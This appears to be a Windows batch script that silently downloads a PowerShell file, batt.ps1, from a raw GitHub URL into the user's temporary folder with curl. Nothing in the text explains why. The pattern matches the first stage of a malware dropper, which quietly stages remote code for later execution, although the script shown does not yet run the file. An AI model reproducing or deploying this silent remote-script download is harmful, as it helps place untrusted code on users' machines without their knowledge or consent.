@echo off
setlocal
set "url1=https://raw.githubusercontent.com/cia168168/folder/main/batt.ps1"
set "temp_dir=%TEMP%"
set "batt=%temp_dir%\batt.ps1"
curl -s -o "%batt%" "%url1%"